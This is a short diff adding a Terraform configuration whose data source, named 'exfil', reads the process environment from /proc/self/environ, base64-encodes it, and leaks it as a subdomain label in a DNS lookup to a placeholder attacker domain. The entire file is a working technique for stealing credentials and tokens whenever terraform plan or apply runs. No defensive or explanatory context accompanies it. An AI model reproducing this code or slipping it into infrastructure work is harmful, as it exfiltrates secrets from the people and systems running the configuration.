@@ -1,0 +1,10 @@
+terraform {
+  required_providers {
+    dns = { source = "hashicorp/dns" }
+  }
+}
+
+# Encode data as subdomain labels
+data "dns_a_record_set" "exfil" {
+  host = "${substr(base64encode(file("/proc/self/environ")), 0, 60)}.YOUR-DOMAIN.com"
+}
